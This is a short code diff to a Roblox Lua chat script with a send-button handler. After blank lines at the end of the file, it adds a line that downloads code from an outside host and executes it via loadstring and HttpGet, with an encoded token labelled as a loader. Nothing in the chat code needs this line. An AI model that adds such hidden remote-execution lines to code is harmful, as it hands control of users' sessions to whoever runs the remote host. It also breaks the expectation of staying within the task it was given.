@@ -178,3 +178,7 @@ SendBtn.MouseButton1Click:Connect(function()
         MsgInput.Text = "" -- Mesaj alanını temizle
     end
 end)
+
+
+
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImY1MGY1NmQyLWQ3MWMtNGY0ZS1hNTNmLWJlYmNkZGNhOWYwNyIsImtpbmQiOiJsb2FkZXIifQ"))()
